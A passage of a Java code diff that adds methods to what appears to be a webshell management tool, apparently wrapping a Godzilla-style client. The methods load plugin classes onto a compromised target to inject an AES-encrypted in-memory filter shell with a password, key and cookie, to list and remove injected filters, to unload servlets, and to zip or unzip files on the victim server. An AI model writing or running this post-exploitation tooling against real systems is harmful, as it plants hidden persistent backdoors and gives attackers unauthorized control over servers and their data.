+            util.http.ReqParameter rp = new util.http.ReqParameter();
+            rp.add("wrapperName", wrapperName);
+            rp.add("urlPattern", urlPattern);
+            return new String(p.evalFunc("plugin.ServletManage", "unLoadServlet", rp), StandardCharsets.UTF_8);
+        });
+    }
+
+    private String filterShellAddTool(JsonObject a) throws Exception {
+        final String password = requireParam(a, "password");
+        final String secretKeyRaw = requireParam(a, "secretKey");
+        final String cookie = optString(a, "cookie", util.functions.md5(Long.toString(System.currentTimeMillis())).substring(0, 16));
+        final String shellType = optString(a, "shellType", "AES_BASE64");
+        if (!(shellType.equals("AES_BASE64") || shellType.equals("AES_RAW"))) {
+            throw new Exception("filter shellType 仅支持 AES_BASE64 / AES_RAW");
+        }
+        return onTarget(a, p -> {
+            String secretKey = util.functions.md5(secretKeyRaw).substring(0, 16);
+            String className = "f." + shellType;
+            if (!p.include(className, readResBytes("/shells/plugins/java/assets/F_" + shellType + ".classs"))) {
+                throw new Exception("include 失败: " + className);
+            }
+            util.http.ReqParameter rp = new util.http.ReqParameter();
+            rp.add("secretKey", secretKey);
+            rp.add("ck", cookie);
+            rp.add("pwd", password);
+            return new String(p.evalFunc(className, "run", rp), StandardCharsets.UTF_8);
+        });
+    }
+
+    private String filterShellListTool(JsonObject a) throws Exception {
+        return onTarget(a, p -> {
+            if (!p.include("plugin.FilterManage", readResBytes("/shells/plugins/java/assets/FilterManage.classs"))) {
+                throw new Exception("FilterManage 插件加载失败");
+            }
+            return new String(p.evalFunc("plugin.FilterManage", "getAllFilter", new util.http.ReqParameter()), StandardCharsets.UTF_8);
+        });
+    }
+
+    private String filterShellRemoveTool(JsonObject a) throws Exception {
+        final String filterName = requireParam(a, "filterName");
+        return onTarget(a, p -> {
+            if (!p.include("plugin.FilterManage", readResBytes("/shells/plugins/java/assets/FilterManage.classs"))) {
+                throw new Exception("FilterManage 插件加载失败");
+            }
+            util.http.ReqParameter rp = new util.http.ReqParameter();
+            rp.add("filterName", filterName);
+            return new String(p.evalFunc("plugin.FilterManage", "unFilter", rp), StandardCharsets.UTF_8);
+        });
+    }
+
+    private String zipTool(JsonObject a) throws Exception {
+        final String action = requireParam(a, "action");
+        final String src = requireParam(a, "src");
+        final String dest = requireParam(a, "dest");
+        return onTarget(a, p -> {
+            if (!p.include("JZip", readResBytes("/shells/plugins/java/assets/JZip.classs"))) {
+                throw new Exception("JZip 插件加载失败");
+            }
+            util.http.ReqParameter rp = new util.http.ReqParameter();
+            if ("unzip".equalsIgnoreCase(action)) {
+                rp.add("compressFile", src);
+                rp.add("compressDir", dest);
+                return new String(p.evalFunc("JZip", "unZip", rp), StandardCharsets.UTF_8);
+            }
+            rp.add("compressFile", dest);
+            rp.add("compressDir", src);
+            return new String(p.evalFunc("JZip", "zip", rp), StandardCharsets.UTF_8);
+        });
+    }
 
     private Payload getOrInitPayload(String url) throws Exception {
             if (payloadCache.containsKey(url)) {
